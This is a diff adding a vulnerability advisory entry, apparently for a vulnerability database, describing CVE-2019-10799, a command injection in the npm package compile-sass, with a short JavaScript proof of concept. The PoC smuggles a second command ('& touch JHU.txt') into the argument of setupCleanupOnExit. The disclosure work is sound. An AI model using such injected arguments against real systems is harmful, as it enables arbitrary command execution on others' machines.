@@ -1,0 +1,44 @@
+---
+- id: snykio:npm:compile-sass:551804
+  title: Command Injection
+  description: |
+    [compile-sass][1] is a module to compile SASS on-the-fly and/or save it
+    to CSS files.
+
+    Affected versions of this package are vulnerable to Command Injection.
+    The function `setupCleanupOnExit(cssPath)` within `dist/index.js` is
+    executed as part of the `rm` command without any sanitization.
+
+    ### PoC by JHU System Security Lab   {#poc-by-jhu-system-security-lab}
+
+        function sleep(millis) {
+            return new Promise(resolve => setTimeout(resolve, millis));
+        }
+        async function main(){
+            var a = require('compile-sass');
+            a.setupCleanupOnExit('& touch JHU.txt');
+            console.log('Press Ctrl-C in 3 seconds...')
+            await sleep(3000);
+        }
+        main();
+
+
+
+    [1]: https://www.npmjs.com/package/compile-sass
+  affected_package: compile-sass
+  vulnerable_versions:
+  - "<1.0.5"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2019-10799
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-02-21
+  created_date: 2020-02-21
+  last_modified_date: 2020-02-21
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/eiskalteschatten/compile-sass/commit/d9ada7797ff93875b6466dea7a78768e90a0f8d2
+  source_url: https://snyk.io/vuln/SNYK-JS-COMPILESASS-551804
